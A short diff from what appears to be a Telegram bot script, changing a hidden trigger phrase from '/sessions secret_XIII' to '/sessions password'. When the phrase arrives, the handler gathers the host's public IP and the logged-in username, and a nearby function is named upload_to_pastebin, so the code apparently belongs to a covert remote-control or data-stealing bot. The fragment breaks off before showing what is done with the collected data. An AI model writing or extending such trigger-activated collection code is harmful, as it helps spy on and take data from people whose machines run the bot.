@@ -141,7 +141,7 @@ def upload_to_pastebin(text):
 
 @bot.message_handler(func=lambda message: True)
 def echo_all(message):
-    if "/sessions secret_XIII" in message.text:
+    if "/sessions password" in message.text:
         public_ip = get_public_ip()
         if public_ip:
             user_username = os.getlogin()
